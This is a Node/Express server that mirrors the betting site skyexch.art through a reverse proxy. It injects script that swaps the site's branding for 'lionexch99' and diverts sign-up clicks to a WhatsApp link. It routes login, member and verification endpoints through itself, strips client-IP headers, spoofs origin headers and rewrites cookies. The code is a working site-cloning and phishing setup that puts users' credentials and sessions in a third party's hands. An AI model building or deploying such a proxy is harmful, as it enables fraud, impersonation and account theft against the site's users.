import express from 'express'
import https from 'node:https'

const app = express()
const PORT = process.env.PORT || 3000

const WHATSAPP_URL =
  'https://api.whatsapp.com/send/?phone=123456789&text&type=phone_number&app_absent=0'
const INSTAGRAM_NAME = 'lionexch99'
const INSTAGRAM_URL = 'https://www.instagram.com/lionexch99'

const INJECTED_HEAD = `
<!-- INJECTED OVERRIDES FOR WHATSAPP SIGN UP & INSTAGRAM LIONEXCH99 -->
<style>
  .icon-support-instagram + span,
  .icon-support-instagram ~ span,
  [class*="icon-support-instagram"] + span,
  [class*="icon-support-instagram"] ~ span {
    font-size: 0 !important;
    display: inline-block !important;
  }
  .icon-support-instagram + span::after,
  .icon-support-instagram ~ span::after,
  [class*="icon-support-instagram"] + span::after,
  [class*="icon-support-instagram"] ~ span::after {
    content: "${INSTAGRAM_NAME}" !important;
    font-size: 13px !important;
    visibility: visible !important;
    display: inline-block !important;
  }
</style>
<script>
  (function() {
    const WA_LINK = ${JSON.stringify(WHATSAPP_URL)};
    const IG_LINK = ${JSON.stringify(INSTAGRAM_URL)};
    const IG_NAME = ${JSON.stringify(INSTAGRAM_NAME)};

    if (!window.location.hash || window.location.hash === '#/' || window.location.hash === '#') {
      window.location.hash = '#/gameHall';
    }

    function fixCaptchaImages() {
      document.querySelectorAll('img').forEach(function(img) {
        if (img.src && (img.src.includes('queryValidationCode') || img.alt === 'verify code')) {
          if (img.src.includes('saapipl.')) {
            img.src = img.src.replace(/https?:\\/\\/saapipl\\.[^\\/]+/, window.location.origin);
          }
        }
      });
    }

    document.addEventListener('click', function(e) {
      const el = e.target.closest('button, a, div, span, li, img');
      if (!el) return;

      if (el.tagName === 'IMG' && (el.src.includes('queryValidationCode') || el.alt === 'verify code')) {
        setTimeout(fixCaptchaImages, 100);
        setTimeout(fixCaptchaImages, 300);
      }

      const text = (el.innerText || el.textContent || '').trim().toLowerCase();

      if (text === 'sign up' || text === 'signup' || text === 'register' || text.includes('get online id')) {
        e.preventDefault();
        e.stopPropagation();
        window.open(WA_LINK, '_blank', 'noopener,noreferrer');
        return false;
      }

      if (text.includes('skyexchindia') || text.includes(IG_NAME) || el.classList.contains('icon-support-instagram') || el.querySelector('.icon-support-instagram')) {
        e.preventDefault();
        e.stopPropagation();
        window.open(IG_LINK, '_blank', 'noopener,noreferrer');
        return false;
      }
    }, true);

    setInterval(function() {
      fixCaptchaImages();
      document.querySelectorAll('span, div, p, a').forEach(function(node) {
        if (node.children.length === 0 && node.textContent && node.textContent.includes('skyexchindia')) {
          node.textContent = node.textContent.replace(/skyexchindia/g, IG_NAME);
        }
      });
    }, 250);
  })();
</script>
`

function proxyRequest(req, res, targetHost, isApi) {
  const forwardHeaders = { ...req.headers }
  delete forwardHeaders['host']
  delete forwardHeaders['x-forwarded-for']
  delete forwardHeaders['x-forwarded-proto']
  delete forwardHeaders['x-forwarded-host']
  delete forwardHeaders['x-real-ip']
  delete forwardHeaders['cf-connecting-ip']
  delete forwardHeaders['cf-ray']
  delete forwardHeaders['cf-visitor']

  forwardHeaders['host'] = targetHost
  forwardHeaders['user-agent'] =
    req.headers['user-agent'] ||
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'

  if (isApi) {
    forwardHeaders['origin'] = 'https://www.skyexch.art'
    forwardHeaders['referer'] = 'https://www.skyexch.art/'
  } else {
    delete forwardHeaders['origin']
    delete forwardHeaders['referer']
  }

  const proxyReq = https.request(
    {
      hostname: targetHost,
      port: 443,
      path: req.originalUrl || req.url,
      method: req.method,
      headers: forwardHeaders,
    },
    (proxyRes) => {
      const respHeaders = { ...proxyRes.headers }
      const reqOrigin = req.headers['origin'] || '*'
      respHeaders['access-control-allow-origin'] = reqOrigin
      respHeaders['access-control-allow-credentials'] = 'true'

      const cookies = proxyRes.headers['set-cookie']
      if (cookies) {
        respHeaders['set-cookie'] = cookies.map((c) =>
          c
            .replace(/Domain=[^;]+;?\s*/gi, '')
            .replace(/SameSite=[^;]+;?\s*/gi, 'SameSite=Lax; ')
        )
      }

      // If it's a JS asset, patch the baseURL dynamically
      if (
        req.url.includes('/assets/') &&
        req.url.endsWith('.js') &&
        proxyRes.statusCode === 200
      ) {
        let body = ''
        proxyRes.on('data', (chunk) => (body += chunk))
        proxyRes.on('end', () => {
          body = body.replace(
            /window\.location\.host\.replace\(\/\^\[\^\.\]\*\/\s*,\s*["']saapipl["']\)/g,
            'window.location.host'
          )
          body = body.replace(
            /\.replace\(\/\^\[\^\.\]\*\/\s*,\s*["']saapipl["']\)/g,
            ''
          )
          delete respHeaders['content-length']
          res.writeHead(200, respHeaders)
          res.end(body)
        })
        return
      }

      res.writeHead(proxyRes.statusCode || 200, respHeaders)
      proxyRes.pipe(res)
    }
  )

  proxyReq.on('error', (err) => {
    console.error('Proxy Error:', err)
    if (!res.headersSent) {
      res.status(502).send('Bad Gateway')
    }
  })

  req.pipe(proxyReq)
}

app.use((req, res, next) => {
  const url = req.url || '/'

  // 1. Root / Portal HTML
  if (url === '/' || url === '/index.html' || url === '/portal') {
    https
      .get(
        'https://www.skyexch.art/',
        {
          headers: {
            'User-Agent':
              req.headers['user-agent'] ||
              'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          },
        },
        (proxyRes) => {
          let html = ''
          proxyRes.on('data', (chunk) => (html += chunk))
          proxyRes.on('end', () => {
            html = html.replace('</head>', INJECTED_HEAD + '</head>')
            res.setHeader('Content-Type', 'text/html; charset=utf-8')
            res.send(html)
          })
        }
      )
      .on('error', (err) => {
        console.error('HTML fetch error:', err)
        res.status(500).send('Error loading portal')
      })
    return
  }

  // 2. API Endpoints
  if (
    url.startsWith('/verify') ||
    url.startsWith('/exchange') ||
    url.startsWith('/login') ||
    url.startsWith('/member') ||
    url.startsWith('/playerService')
  ) {
    return proxyRequest(req, res, 'saapipl.skyexch.art', true)
  }

  // 3. Static Asset Endpoints
  if (
    url.startsWith('/assets') ||
    url.startsWith('/plugins') ||
    url.startsWith('/source') ||
    url.startsWith('/themes') ||
    url.startsWith('/submodules') ||
    url.startsWith('/image-manifest.json')
  ) {
    return proxyRequest(req, res, 'www.skyexch.art', false)
  }

  next()
})

app.listen(PORT, () => {
  console.log(`SkyPro Production Server running on port ${PORT}`)
})
